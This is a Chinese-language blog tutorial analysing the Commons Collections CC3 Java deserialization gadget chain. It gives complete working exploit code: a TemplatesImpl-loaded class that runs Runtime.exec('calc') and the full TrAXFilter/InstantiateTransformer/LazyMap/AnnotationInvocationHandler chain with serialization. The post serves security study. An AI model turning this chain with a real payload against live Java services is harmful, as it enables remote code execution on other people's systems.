---
title: JAVA安全:CC3链
---

*作者：Narcher*	*时间：2024/3/18*	*分类：Vulnerability Analysis*

<!--more-->

## 前言

CC3这条链子和之前的几条链子不太一样，它更改了命令执行的方式。之前的几条链子都是反射调用Runtime.getRuntime.exec("calc")执行的命令，而CC3则是利用的动态类加载。简单来说，就是Java文件无法直接运行，需要编译成.class文件，再通过加载器加载到Java虚拟机的内存空间中才能运行。其核心便是ClassLoader类，其中的loadClass-->findClass-->defineClass三个方法的调用是必须的，最重要的是defineClass方法。

说了那么多，不如直接写一个例子看一看：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771803258.png" alt="1710771803258" style="zoom: 67%;" />

其中，CC3_test中则是：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710771886159.png" alt="1710771886159" style="zoom: 50%;" />

emmm.......

了解了这些之后，应该就差不多能理解整条CC3链子了，我们直接进入正文。



## 正文

和往常一样，我们先看一下ysoserial中链子的调用流程：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710772037318.png" alt="1710772037318" style="zoom:50%;" />

可见其中对CC1的后半部分保留完整，大致是在LazyMap.get方法的触发之前的流程给改了，我们就一点点看吧。

### 1.TemplatesImpl部分

首先我们要找重写了defineClass方法且可序列化的类，且参数可控，往上便找到了TemplatesImpl:

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710810342680.png" alt="1710810342680" style="zoom:67%;" />

然后就按正常流程，一点点往上找就完了。

于是便找到了调用defineClass方法的地方：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710810463141.png" alt="1710810463141" style="zoom: 50%;" />

关键代码就这么多，反正就是defineTransletClasses方法中的for循环里调用了，且_bytecodes可控。

再向上找：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710813072129.png" alt="1710813072129" style="zoom: 67%;" />

找到了getTransletInstance方法，再向上找便找到了newTransformer：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710812724055.png" alt="1710812724055" style="zoom:67%;" />

看到这里，就基本上完成了，我们只需要注意一下传参，链子的大致形状就差不多确定了。

传参部分呢，我们从前往后看，正常来说看到的便只需赋值\_name参数，让它不要返回null，并且\_class参数不能传，因为我们要的就是defineTransletClasses方法，最关键的\_bytecode必须传，因为我们要用它来作为执行代码的载体。这样编译好了之后会发现报错，调进去一看可看到问题出在调用\_factory参数的地方，那么这个参数我们也要传。先看一下代码中它本身应该是什么：

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710813705054.png" alt="1710813705054" style="zoom:67%;" />

是TransformerFactoryImpl类的实例，那我们就传这个。

那么这部分的链子就构造的差不多了：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
templates.newTransformer();
```

对了，这里还有一点要提醒，编译执行代码的class文件的java文件需要继承AbstractTranslet这个类，不然就会报空指针错误，继承之后还让实现一下接口，我们实现了就好了。

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710814078344.png" alt="1710814078344" style="zoom:67%;" />

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710814148732.png" alt="1710814148732" style="zoom:67%;" />

java文件内容差不多是这样：

```java
public class CC3_test extends AbstractTranslet {
    static {
        try{
            Runtime.getRuntime().exec("calc");
        }catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {

    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {

    }
}
```

剩下的话，除了要注意一下要把ChainedTransformer的内容改一下，使其触发templates的newTransformer方法就好了。我们就直接把CC1链子的前半部分拿过来：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
// templates.newTransformer();
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(templates),
        new InvokerTransformer("newTransformer",null,null),
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
//反射获取AnnotationInvocationHandler类
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC3.txt"));
oos.writeObject(handler);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC3.txt"));
ois.readObject();
```

看起来不错，但和ysoserial中的链子还是有差别，我们需要对其进行更改，把InvokerTransformer给用其他调用newTransformer的类替代掉，因为有的jdk版本中对InvokerTransformer做了过滤。ysoserial中用的是TrAXFilter和InstantiateTransformer。我们一个个看，先看TrAXFilter，再看InstantiateTransformer。

### 2.ChainedTransformer部分

#### 2.1 TrAXFilter部分

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710815926397.png" alt="1710815926397" style="zoom:67%;" />

可见其构造器，我们直接传入templates对象便可调用其newTransformer方法，只是可惜TrAXFilter没有实现Serializable接口，只能用TrAXFilter配合反射来解决这个问题，于是便有了InstantiateTransformer。

#### 2.2 InstantiateTransformer部分

<img src="JAVA%E5%AE%89%E5%85%A8CC3%E9%93%BE/1710816158402.png" alt="1710816158402" style="zoom:67%;" />

关键代码就这些，我们只需要把TrAXFilter.class作为input参数传进去就好了，至于paramTypes我们可以传一个new Class[]{Templates.class}，而参数就直接传构造好的templates，把链子构造起来就是如下模样：

```java
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
```

### 3.构造链

我们直接把ChainedTransformer部分的修改给添上去就好了：

```java
TemplatesImpl templates = new TemplatesImpl();
Class tc = templates.getClass();
Field nameField = tc.getDeclaredField("_name");
nameField.setAccessible(true);
nameField.set(templates,"aaaa");
Field bytecodesField = tc.getDeclaredField("_bytecodes");
bytecodesField.setAccessible(true);
byte[] code = Files.readAllBytes(Paths.get("C://Users//Narcher//IdeaProjects//CC3_test.class"));
byte[][] codes = {code};
bytecodesField.set(templates,codes);
Field tfactoryField = tc.getDeclaredField("_tfactory");
tfactoryField.setAccessible(true);
tfactoryField.set(templates, new TransformerFactoryImpl());
// templates.newTransformer();
Transformer[] transformers=new Transformer[]{
        new ConstantTransformer(TrAXFilter.class),
        new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
};
ChainedTransformer chainedTransformer= new ChainedTransformer(transformers);
HashMap<Object,Object> map = new HashMap<>();
map.put("value","value");
LazyMap innerMap = (LazyMap) LazyMap.decorate(map, chainedTransformer);
//反射获取AnnotationInvocationHandler类
Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
constructor.setAccessible(true);
InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class,innerMap);
Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(),new Class[]{Map.class},handler);
handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);
//序列化
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("C:\\Users\\Narcher\\IdeaProjects\\CC3.txt"));
oos.writeObject(handler);
//反序列化
ObjectInputStream ois = new ObjectInputStream(new FileInputStream("C:\\Users\\Narcher\\IdeaProjects\\CC3.txt"));
ois.readObject();
```

这样一来，CC3也便大功告成了。
